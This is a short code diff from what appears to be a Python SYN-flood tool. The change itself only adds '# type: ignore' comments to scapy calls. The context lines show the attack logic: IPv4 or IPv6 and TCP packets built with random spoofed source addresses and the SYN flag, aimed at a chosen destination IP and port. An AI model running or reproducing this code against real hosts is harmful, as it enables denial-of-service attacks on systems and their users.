@@ -37,14 +37,14 @@ def syn_flood(dst_ip, dst_port, counter, six: bool):
 
         # pylint: disable=no-member
         if six:
-            ip_packet = scapy.all.IPv6()
+            ip_packet = scapy.all.IPv6()  # type: ignore
         else:
-            ip_packet = scapy.all.IP()
+            ip_packet = scapy.all.IP()  # type: ignore
         ip_packet.src = random_ip()
         ip_packet.dst = dst_ip
 
         # pylint: disable=no-member
-        tcp_packet = scapy.all.TCP()
+        tcp_packet = scapy.all.TCP()  # type: ignore
         tcp_packet.sport = s_port
         tcp_packet.dport = int(dst_port)
         tcp_packet.flags = "S"
